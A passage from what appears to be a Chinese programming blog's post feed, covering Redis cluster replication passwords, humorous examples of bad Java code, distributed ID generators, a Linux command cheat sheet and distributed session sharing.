class="line-numbers-rows"><span></span></span></code></pre><p>-c：cluster，连接到集群模式，否则key不落在本实例将会报错。</p><p>-h：host，指定连接主机。</p><p>-p：port，指定连接端口。</p><p>-a：auth，指定密码，集群模式需要指定，不然移动会认证失败。</p><pre class="line-numbers language-none"><code class="language-none">$ .&#x2F;redis-cli -c -h 192.168.1.8 -p 9002 -a 123456127.0.0.1:9002&gt; set hnad 21233-&gt; Redirected to slot [2114] located at 127.0.0.1:9001OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如上，键hnad被转移到实例9001。</p><h4 id="主从复制不能同步问题解决"><a href="#主从复制不能同步问题解决" class="headerlink" title="主从复制不能同步问题解决"></a>主从复制不能同步问题解决</h4><p>搭建一个3主3从的Redis Cluster集群发现从实例不能同步主实例的数据，但确认搭建的步骤和参数都没啥问题啊，官网也没有给出对应的问题解决方案。</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>后来查各种资料发现，是因为主实例设置了密码，从实例配置中需要配置主实例的连接密码才能实现主从复制同步。</p><p>就是下面这个配置：</p><pre class="line-numbers language-none"><code class="language-none"># If the master is password protected (using the &quot;requirepass&quot; configuration# directive below) it is possible to tell the slave to authenticate before# starting the replication synchronization process, otherwise the master will# refuse the slave request.## masterauth &lt;master-password&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>翻译：</p><pre class="line-numbers language-none"><code class="language-none">如果master是密码保护的，下面的配置就是可以告诉从实例在启动集群同步复制进程之前要经过认证，否则主实例会拒绝从实例的请求。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="解决流程"><a href="#解决流程" class="headerlink" title="解决流程"></a>解决流程</h4><p>所以，要解决不同步问题，先停止6个从实例，然后在每个实例的redis.conf文件中加入对应主备实例的认证密码，然后再启动各个从实例。如：</p><pre class="line-numbers language-none"><code class="language-none">masterauth 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后主实例上的数据实时变化都会同步到从实例，问题解决。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码写成这样，老夫无可奈何</title>
      <link href="/2025/10/29/%E5%85%B6%E4%BB%96/%E4%BB%A3%E7%A0%81%E5%86%99%E6%88%90%E8%BF%99%E6%A0%B7%EF%BC%8C%E8%80%81%E5%A4%AB%E6%97%A0%E5%8F%AF%E5%A5%88%E4%BD%95/"/>
      <url>/2025/10/29/%E5%85%B6%E4%BB%96/%E4%BB%A3%E7%A0%81%E5%86%99%E6%88%90%E8%BF%99%E6%A0%B7%EF%BC%8C%E8%80%81%E5%A4%AB%E6%97%A0%E5%8F%AF%E5%A5%88%E4%BD%95/</url>
      
        <content type="html"><![CDATA[<p>你见过最无可奈何的代码是什么？</p><p>今天，栈长就来总结一下我遇到过的一些神逻辑代码，不一定很全，但我真心写不出，真心让我自叹不如啊！</p><h4 id="1、耍猴的最佳手段"><a href="#1、耍猴的最佳手段" class="headerlink" title="1、耍猴的最佳手段"></a>1、耍猴的最佳手段</h4><p>还记得 XX 手机的抢购活动么，抢购按钮的代码类似是这样的：</p><pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;javasript:alert(&#39;抢购结束!&#39;)&quot;&gt;立即抢购&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>活动还没开始就结束了。。</p><p>后面有人挖出来这段神逻辑，大家真是哭晕在厕所了，还好，抢购买手机这种我从来不参加。。</p><p>就是在前端写死代码造成抢购结束的假象，其实请求压根没有发送到服务器，或者休眠几秒直接跳转到抢购结束页面，良心点的，点 10 次有一次发到服务器就不错了，这样耍猴是不是太好玩了？</p><p>众所周知，为了提高服务器的承载能力，现在各类 APP、网页等都会或多或少加入前端缓存，但上面这种耍猴的代码也太无耻了。</p><h4 id="2、猪一样的队友"><a href="#2、猪一样的队友" class="headerlink" title="2、猪一样的队友"></a>2、猪一样的队友</h4><p>大家有没有见过这样的代码：</p><pre class="line-numbers language-none"><code class="language-none"><!-- 原价 180 元，现在活动价 228 元，活动结束后恢复原价 -->...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这上面的活动价比原价还贵，真是哭笑不得……</p><p>类似这样的代码，一些程序员在注释中说明活动的内容，又或者是把一些生产上环境的 IP、端口、用户名、密码等敏感信息把在注释中，好随时能切换……</p><p>真是猪一样的队友，这样的程序员不开除么！？定时炸弹啊！</p><h4 id="3、最牛逼的排序算法"><a href="#3、最牛逼的排序算法" class="headerlink" title="3、最牛逼的排序算法"></a>3、最牛逼的排序算法</h4><p>据说是一个月薪 9K 的 Java 程序员，因老板让他写一个排序算法，然后他就写了一段屌炸天的休眠排序算法，接着他就被老板开除了……</p><p><strong>排序算法代码大概是这样的：</strong></p><p><img src="http://qianniu.javastack.cn/18-11-12/78854675.jpg"></p><p>这段代码的完整版解释请看这篇文章：<a href="https://mp.weixin.qq.com/s/fa1SM8Y9AnUkGinO1RqR7Q">刚写完排序算法，就被开除了…</a></p><p>排序排成这样，不开除你，开除谁？</p><h4 id="4、休眠的最高境界"><a href="#4、休眠的最高境界" class="headerlink" title="4、休眠的最高境界"></a>4、休眠的最高境界</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 获取未来几天的日期 * @param days 指定的天数 * @author  * @return *&#x2F;public static Date getNextDays(int days)&#123;try &#123;    &#x2F;&#x2F; 休眠指定的天数Thread.sleep(days * 24 * 60 * 60 * 1000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#x2F;&#x2F; 休眠结束后返回日期return new Date();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取指定日期用休眠？写完，已笑晕在厕所。。。</p><p>完整版的解释请看这篇文章：<a href="https://mp.weixin.qq.com/s/Or3q3souk1GGVNB2qvEY2Q">刚写完这段代码，就被开除了……</a>。</p><p>想离职找不到借口？</p><p>那还不容易，哥送你这段加强版，复制这段代码，提交打包测试上线，坐等开除。</p><h4 id="5、真就是假，假就是真"><a href="#5、真就是假，假就是真" class="headerlink" title="5、真就是假，假就是真"></a>5、真就是假，假就是真</h4><pre class="line-numbers language-none"><code class="language-none">boolean isBoy &#x3D; user.isBoy() &#x3D;&#x3D; true ? true: false;if (isBoy)&#123;    ...&#125; else &#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>布尔值可以直接拿来用，你硬要写个三元表达式？年底绩效考核了，代码量有 KPI 么？</p><p>还有类似这样的：</p><pre class="line-numbers language-none"><code class="language-none">if (xx1 &#x3D;&#x3D; true &amp;&amp; xx2 !&#x3D;  true)&#123;    ...&#125; else &#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有这样的：</p><pre class="line-numbers language-none"><code class="language-none">if (xx1 &gt; xx2)&#123;    return true;&#125; else &#123;    return false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写得太优雅了！</p><h4 id="6、循环循环循环"><a href="#6、循环循环循环" class="headerlink" title="6、循环循环循环"></a>6、循环循环循环</h4><pre class="line-numbers language-none"><code class="language-none">for (int i &#x3D; 0; i &lt; 1; i++)&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一个循环也用循环，曾经就遇到过这么一段，不知所云了，要改这段代码，还要把他叫在旁边坐着，看着改才行。。</p><pre class="line-numbers language-none"><code class="language-none">for (;;)&#123;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>死循环这么写，我们就看不出来了么？</p><h4 id="7、魔法值的真谛"><a href="#7、魔法值的真谛" class="headerlink" title="7、魔法值的真谛"></a>7、魔法值的真谛</h4><p>曾经检查代码时，发现代码中很多魔法值，叫同事要定义成公共常量，结果来了这么一段：</p><pre class="line-numbers language-none"><code class="language-none">private final static int ZERO &#x3D; 0;private final static int ONE &#x3D; 1;private final static int TWO &#x3D; 2;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看到上面的常量定义，我真想打人，虽然魔法值是没了，但又定义了一些没有意义的常量，完全没有理解修改魔法值的真谛，这和脱裤子放屁有什么区别？</p><p>上面还只是一个简单的示例，实际审查情况远比你想象的糟糕。</p><h4 id="8、看花眼的参数"><a href="#8、看花眼的参数" class="headerlink" title="8、看花眼的参数"></a>8、看花眼的参数</h4><pre class="line-numbers language-none"><code class="language-none">Order order &#x3D; new Order(orderNo, 1678.13, &quot;CNY&quot;, 1, 3, &quot;wx&quot;, 5, &quot;1&quot;, 0, &quot;8&quot;, 0, 1, new Date());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到这样的代码，我也是醉醉的了。</p><p>我就见过同事写出这样的代码，是赶时间呢，还是真的不会设计模式，一个构造函数参数能写这么多，且不说魔法值，这么长，看一眼都觉得头大。</p><h4 id="9、消失的异常"><a href="#9、消失的异常" class="headerlink" title="9、消失的异常"></a>9、消失的异常</h4><pre class="line-numbers language-none"><code class="language-none">try &#123;    ...&#125; catch (Exception e) &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序捕捉了异常，却不打印。</p><pre class="line-numbers language-none"><code class="language-none">try &#123;    ...&#125; catch (Exception e) &#123;e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>错误是输出来了，但没有输出到日志文件。</p><pre class="line-numbers language-none"><code class="language-none">try &#123;    ...&#125; catch (Exception e) &#123;logger.info(&quot;...&quot;, e);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>日志级别用的不对，去错误日志文件里面死活找不着错误日志。</p><p>上面的种种不规范的写法，在生产环境出现问题时，一方面导致排查问题艰难，另一方面，监控系统也不能及时地监控到异常。</p><h4 id="10、神奇的if"><a href="#10、神奇的if" class="headerlink" title="10、神奇的if"></a>10、神奇的if</h4><p>最后一个了，压轴了。。</p><p>来，我们一起赏析下这段神奇的 if 代码：</p><pre class="line-numbers language-none"><code class="language-none">if(user.getFirstName() !&#x3D; null)    if(user.getMiddleName() !&#x3D; null)        if(user.getLastName() !&#x3D; null)            if(user.getNickName() !&#x3D; null)                if(user.getShortName() !&#x3D; null)                    if(user.getFullName() !&#x3D; null)                        if(user.getFamilyName() !&#x3D; null)                            if(user.getEnglishName() !&#x3D; null)                                ...                                return true;return false;                                <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码够奇葩了吧，一个 if 能搞定的非要写这么长，还缩进得这么有层次感。。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>写神逻辑代码的人才这么多，找问题、解决问题真是太难了。<br>你见过最烂的代码写成什么样？欢迎留言分享~</p><p>觉得不错，可以把文章分享给同学、同事们！</p><p><img src="http://img.javastack.cn/wx_search_javastack.png"></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写完这段代码</title>
      <link href="/2025/10/29/%E5%85%B6%E4%BB%96/%E5%86%99%E5%AE%8C%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81/"/>
      <url>/2025/10/29/%E5%85%B6%E4%BB%96/%E5%86%99%E5%AE%8C%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>开除的原因是因为没写注释吗？</p><p>显然不是，休眠的逻辑，大家都懂，不需要写注释，你注释写休眠 1 天也没意义啊。。。</p><p>这个程序员的思维不是一般的牛啊，获取下一天的日期，居然要休眠等到下一天再获取，欲哭无泪。。。</p><p><strong>再来看下加强版的，获取未来几天的日期。。。</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * 获取未来几天的日期 * @param days 指定的天数 * @author  * @return *&#x2F;public static Date getNextDays(int days)&#123;try &#123;    &#x2F;&#x2F; 休眠指定的天数Thread.sleep(days * 24 * 60 * 60 * 1000);&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#x2F;&#x2F; 休眠结束后返回日期return new Date();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写完，已笑晕在厕所。。。</p><p>想离职找不到借口？</p><p>那还不容易，哥送你这段加强版，复制这段代码，提交打包测试上线，坐等开除。</p><p><strong>说了这么多，那正确的获取未来的日期的姿势是什么呢？</strong></p><pre class="line-numbers language-none"><code class="language-none">public static Date getNextDays(int days) &#123;Calendar c &#x3D; Calendar.getInstance();c.setTime(new Date());c.add(Calendar.DATE, days);return c.getTime();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>建议使用 Apache 的 <code>commons-lang</code> 工具类，没有必要重复造轮子，还没别人造得好。。。</p><blockquote><p>org.apache.commons.lang3.time.DateUtils#addDays</p></blockquote><p>原理也是使用了 Java 中的 Calendar 类来处理的。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写完排序算法</title>
      <link href="/2025/10/29/%E5%85%B6%E4%BB%96/%E5%86%99%E5%AE%8C%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2025/10/29/%E5%85%B6%E4%BB%96/%E5%86%99%E5%AE%8C%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s/Or3q3souk1GGVNB2qvEY2Q">刚写完这段代码，就被开除了……</a></p><p>栈长前些天刚写完上面这篇文章，没几天，又来一个悲剧。。。</p><p>据说是一个月薪 9K 的 Java 程序员，因老板让他写一个排序算法，然后他就写了一段屌炸天的休眠排序算法，接着他就被老板开除了……</p><p><strong>排序算法代码大概是这样的：</strong></p><p><img src="http://qianniu.javastack.cn/18-11-12/78854675.jpg"></p><p>这段代码有什么问题？</p><p>这个程序员更屌啊，数字排序，用一行简单的 Arrays.sort 就搞定的东西，他竟用到了这么多概念。</p><p>1、循环</p><p>2、线程休眠</p><p>3、多线程</p><p>下面贴上完整的代码：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  *&#x2F;public class ArraySort implements Runnable &#123;    private int number;    public ArraySort(int number) &#123;        this.number &#x3D; number;    &#125;    public static void main(String[] args) &#123;        int[] numbers &#x3D; new int[]&#123;102, 338, 62, 9132, 580, 666&#125;;        for (int number : numbers) &#123;            new Thread(new ArraySort(number)).start();        &#125;    &#125;    @Override    public void run() &#123;        try &#123;            Thread.sleep(this.number);            System.out.println(this.number);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还好是数字小啊，还好休眠是毫秒啊，要是数字大，要是休眠时间是秒，那要等多少休眠时间才能排序完？</p><p>按道理，他的程序也没问题啊，老板为什么要开除他？应用程序中出 BUG 不是很正常的事吗？但他这种排序思维，能写出这样的隐藏 BUG 也是绝了，创造性的发明了 “休眠排序” 算法，系统里面还不知道有多少这样的坑，不开除他开除谁啊？</p><p>或许他应该看一下排序这篇文章：《<a href="https://mp.weixin.qq.com/s/vgpKzmEjuJkhFy-NfpvURQ">图文带你了解 8 大排序算法</a>》。</p><p>说到这个程序员，让我想起了最近审查代码时候的几个坑，真是让人哭笑不得。。。</p><p><strong>示例1：</strong></p><pre class="line-numbers language-none"><code class="language-none">if(flag  &#x3D;&#x3D; false)&#123;    return true;&#125; else &#123;    return false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接 return flag 不行？写这么绕，还把逻辑写错了。</p><p><strong>示例2：</strong></p><pre class="line-numbers language-none"><code class="language-none">if(...)    a    b    c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>多段代码，if 不加 {}，后面格式化成了：</p><pre class="line-numbers language-none"><code class="language-none">if(...)    abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样导致业务逻辑有严重的 BUG，无语了吧？还有更多奇葩的，栈长审查代码真心累。。。</p><p>你还见过哪些更奇葩的代码？欢迎留言分享一下。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式 ID 生成器的解决方案总结</title>
      <link href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%20ID%20%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/"/>
      <url>/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%20ID%20%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><img src="http://devstorepic.qiniudn.com/FrI-z_yi7g7M7AcgxkOPdB47N_MQ" alt="image"></p><p>在互联网的业务系统中，涉及到各种各样的ID，如在支付系统中就会有支付ID、退款ID等。那一般生成ID都有哪些解决方案呢？特别是在复杂的分布式系统业务场景中，我们应该采用哪种适合自己的解决方案是十分重要的。下面我们一一来列举一下，不一定全部适合，这些解决方案仅供你参考，或许对你有用。</p><p><strong>一个ID一般来说有下面几种要素：</strong></p><ul><li>唯一性：确保生成的ID是全网唯一的。</li><li>有序递增性：确保生成的ID是对于某个用户或者业务是按一定的数字有序递增的。</li><li>高可用性：确保任何时候都能正确的生成ID。</li><li>带时间：ID里面包含时间，一眼扫过去就知道哪天的交易。</li></ul><h5 id="系统时间毫秒数"><a href="#系统时间毫秒数" class="headerlink" title="系统时间毫秒数"></a>系统时间毫秒数</h5><p>我们可以使用当前系统时间精确到毫秒数+业务属性+用户属性+随机数+…等参数组合形式来确保ID的唯一性，缺点是ID的有序性难以保证，要保证有序性就要依赖数据库或者其他中间存储媒介。</p><h5 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h5><p>Java自带的生成UUID的方式就能生成一串唯一随机32位长度数据，而且够我们用N亿年，保证唯一性肯定是不用说的了，但缺点是它不包含时间、业务数据可读性太差了，而且也不能ID的有序递增。</p><p>这是一种简单的生成方式，简单，高效，但在一般业务系统中我还没见过有这种生成方式。</p><h5 id="数据库自增ID"><a href="#数据库自增ID" class="headerlink" title="数据库自增ID"></a>数据库自增ID</h5><p>我们都知道为数据库主键设置自增序号，以一定的趋势自增，以保证主键ID的唯一性。</p><p>这个方案很简单，但最主要的问题在于依赖数据库本身，这就无形增加了对数据库的访问压力和依赖，一旦对单库进行分库分表或者数据迁移就尴尬了。</p><p>所以，这也不是合适的ID生成方法。</p><h5 id="批量生成ID"><a href="#批量生成ID" class="headerlink" title="批量生成ID"></a>批量生成ID</h5><p>一次按需批量生成多个ID，每次生成都需要访问数据库，将数据库修改为最大的ID值，并在内存中记录当前值及最大值。这样就避免了每次生成ID都要访问数据库并带来压力。</p><p>这种方案服务就是单点了，如果服务重启势必会造成ID丢失不连续的情况，而且这种方式也不利于水平扩展。</p><h5 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h5><p>Redis的所有命令操作都是单线程的，本身提供像incr这样的自增命令，所以能保证生成的ID肯定是唯一有序的。</p><p>这种方式不依赖关系数据库，而且速度快。但系统要引入Redis这一中间件，增加维护成本，而且编码和配置工作量比较大。即使已经有了Redis组件，但生成ID的高频率访问对单线程的Redis性能势必也会造成影响。</p><p>还可以利用像Zookeeper中的znode数据版本来生成序列号，及MongoDB的ObjectId等，这种利用中间件的做法不是很推荐。</p><h5 id="snowflake算法"><a href="#snowflake算法" class="headerlink" title="snowflake算法"></a>snowflake算法</h5><p><img src="http://images2015.cnblogs.com/blog/913887/201603/913887-20160325101451339-2081640491.jpg" alt="image"></p><p>如上图的所示，Twitter的snowflake算法下面几部分组成：</p><ul><li>41位的时间序列，精确到毫秒，可以使用69年</li><li>10位的机器标识，最多支持部署1024个节点</li><li>12位的序列号，支持每个节点每毫秒产生4096个ID序号，最高位是符号位始终为0。</li></ul><p>这种方案性能好，在单机上是递增的，但是由于涉及到分布式环境，每台机器上的时钟不可能完全同步，也许有时候也会出现不是全局递增的情况。</p><p>而且这个项目在2010就停止维护了，但这个设计思路还是应用于其他各个ID生成器及变种。</p><h5 id="UidGenerator"><a href="#UidGenerator" class="headerlink" title="UidGenerator"></a>UidGenerator</h5><p>UidGenerator是百度开源的分布式ID生成器，基于于snowflake算法的实现，看起来感觉还行。不过，国内开源的项目维护性真是担忧。</p><p>大家可以参考具体使用：</p><blockquote><p><a href="https://github.com/baidu/uid-generator/blob/master/README.zh_cn.md">https://github.com/baidu/uid-generator/blob/master/README.zh_cn.md</a></p></blockquote><h5 id="Leaf"><a href="#Leaf" class="headerlink" title="Leaf"></a>Leaf</h5><p>Leaf是美团开源的分布式ID生成器，能保证全局唯一性、趋势递增、单调递增、信息安全，里面也提到了几种分布式方案的对比，但也需要依赖关系数据库、Zookeeper等中间件。</p><p>具体可以参考官网说明：</p><blockquote><p><a href="https://tech.meituan.com/MT_Leaf.html">https://tech.meituan.com/MT_Leaf.html</a></p></blockquote><p>好了，就这么多了，不同的方案应用的场景和系统也是不同的。大家有更好的方案也可以在下面留言，一起讨论下大家都是怎么做的。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 程序员必须掌握的常用 Linux 命令</title>
      <link href="/2025/10/29/Linux/Java%20%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E9%A1%BB%E6%8E%8C%E6%8F%A1%E7%9A%84%E5%B8%B8%E7%94%A8%20Linux%20%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/10/29/Linux/Java%20%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E9%A1%BB%E6%8E%8C%E6%8F%A1%E7%9A%84%E5%B8%B8%E7%94%A8%20Linux%20%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-1-15/89474934.jpg"></p><p>Java程序员也是半个运维了，在日常开发中经常会接触到Linux环境操作。小公司的开发人员甚至是兼了全运维的工作，下面整理了一些常用的Linux操作命令。</p><p><strong>Linux常用指令</strong></p><pre class="line-numbers language-none"><code class="language-none">ls　　        显示文件或目录     -l       列出文件详细信息l(list)     -a       列出当前目录下所有文件及目录，包括隐藏的a(all)     mkdir         创建目录     -p       创建目录，若无父目录，则创建p(parent)cd            切换目录touch         创建空文件vim &#x2F; vi      创建&#x2F;编辑文件     insert   编辑          :q       退出          :q!      强制退出          :wq      保存并退出          esc      退出编辑echo          创建带有内容的文件cat           查看文件内容tar           打包压缩     -c       建立压缩档案          -x       解压缩文件          -z       gzip压缩文件          -j       bzip2压缩文件          -v       显示所有过程          -f       使用档名    cp            拷贝     -r       递归拷贝目录mv            移动或重命名rm            删除文件     -r       递归删除，可删除子目录及文件     -f       强制删除     chmod         变更文件或目录的权限kill          杀进程find          在文件系统中搜索某文件wc            统计文本中行数、字数、字符数grep          在文本文件中查找某个字符串rmdir         删除空目录tree          树形结构显示目录，需要安装tree包pwd           显示当前目录ln            创建链接文件date          显示系统时间more &#x2F; less   分页显示文本文件内容head &#x2F; tail   显示文件头、尾内容sudo          用来以其他身份来执行命令，预设的身份为rootsu            换当前用户身份到其他用户身份stat          显示指定文件的详细信息，比ls更详细who           显示在线登陆用户whoami        显示当前操作用户hostname      显示主机名uname         显示系统信息top           动态显示当前耗费资源最多进程信息ps            显示瞬间进程状态          -e       显示所有进程          -f       全格式du            查看目录大小     -s       只显示目录大小的总合          -h       带单位显示目录大小df            查看磁盘大小df          -h       带有单位显示磁盘信息     free          查看内存情况     -b       单位（bytes）          -k       单位（KB）          -m       单位（MB）          -g       单位（GB）ifconfig      查看网络情况ping          测试网络连通netstat       显示网络状态信息     -ano     查看某个端口是否被占用          -tlnp    根据端口查找PIDman           查看Linux中的指令帮助clear         清屏kill          杀进程reboot        重启系统shutdown     -r       关机重启     -h       关机不重启     now      立刻关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上命令仅供参考，欢迎留言补充。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式 Session 共享解决方案</title>
      <link href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%20Session%20%E5%85%B1%E4%BA%AB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%20Session%20%E5%85%B1%E4%BA%AB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>Session是服务器用来保存用户操作的一系列会话信息，由Web容器进行管理。单机情况下，不存在Session共享的情况，分布式情况下，如果不进行Session共享会出现请求落到不同机器要重复登录的情况，一般来说解决Session共享有以下几种方案。</p><p><strong>1、session复制</strong></p><p>session复制是早期的企业级的使用比较多的一种服务器集群session管理机制。应用服务器开启web容器的session复制功能，在集群中的几台服务器之间同步session对象，使得每台服务器上都保存所有的session信息，这样任何一台宕机都不会导致session的数据丢失，服务器使用session时，直接从本地获取。</p><p>这种方式在应用集群达到数千台的时候，就会出现瓶颈，每台都需要备份session，出现内存不够用的情况。</p><p><strong>2、session绑定</strong></p><p>利用hash算法，比如nginx的ip_hash,使得同一个Ip的请求分发到同一台服务器上。</p><p>这种方式不符合对系统的高可用要求，因为一旦某台服务器宕机，那么该机器上的session也就不复存在了，用户请求切换到其他机器后么有session，无法完成业务处理。</p><p><strong>3、利用cookie记录session</strong></p><p>session记录在客户端，每次请求服务器的时候，将session放在请求中发送给服务器，服务器处理完请求后再将修改后的session响应给客户端。这里的客户端就是cookie。</p><p>利用cookie记录session的也有缺点，比如受cookie大小的限制，能记录的信息有限；每次请求响应都需要传递cookie，影响性能，如果用户关闭cookie，访问就不正常。但是由于</p><p>cookie的简单易用，可用性高，支持应用服务器的线性伸缩，而大部分要记录的session信息比较小，因此事实上，许多网站或多或少的在使用cookie记录session。</p><p><strong>4、session服务器</strong></p><p>session服务器可以解决上面的所有的问题，利用独立部署的session服务器（集群）统一管理session，服务器每次读写session时，都访问session服务器。</p><p>这种解决方案事实上是应用服务器的状态分离，分为无状态的应用服务器和有状态的session服务器，然后针对这两种服务器的不同特性分别设计架构。</p><p>对于有状态的session服务器，一种比较简单的方法是利用分布式缓存（memcached), 